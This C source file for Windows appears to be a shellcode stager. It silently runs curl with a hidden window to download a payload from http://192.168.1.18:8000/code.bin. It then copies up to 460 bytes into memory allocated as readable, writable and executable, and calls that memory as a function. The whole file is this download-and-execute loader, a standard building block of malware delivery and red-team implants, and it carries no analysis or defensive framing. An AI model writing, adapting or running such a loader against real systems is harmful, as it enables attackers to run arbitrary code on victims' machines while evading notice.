#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define PAYLOAD_SIZE 460 // Adjust based on your actual payload size

int main() {
    // Command to download the shellcode using curl
    const char *command = "curl -s http://192.168.1.18:8000/code.bin"; // Use -s for silent mode
    unsigned char code[PAYLOAD_SIZE];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD bytesRead = 0;
    
    // Initialize the startup info structure
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide window

    // Create the process to run the curl command
    if (!CreateProcess(NULL, (LPSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    // Wait until the process has finished
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Read the output from the process
    FILE *fpipe = _popen(command, "r");
    if (fpipe == NULL) {
        perror("_popen() failed.");
        exit(EXIT_FAILURE);
    }

    int counter = 0;
    // Read data from the curl command output
    while (fread(&code[counter], sizeof(unsigned char), 1, fpipe) > 0 && counter < PAYLOAD_SIZE) {
        counter++;
    }

    _pclose(fpipe); // Close the pipe

    // Allocate memory for the shellcode
    void *exec = VirtualAlloc(NULL, PAYLOAD_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        printf("VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Copy the downloaded data to the allocated memory
    memcpy(exec, code, counter);

    // Execute the shellcode
    ((void(*)())exec)();

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
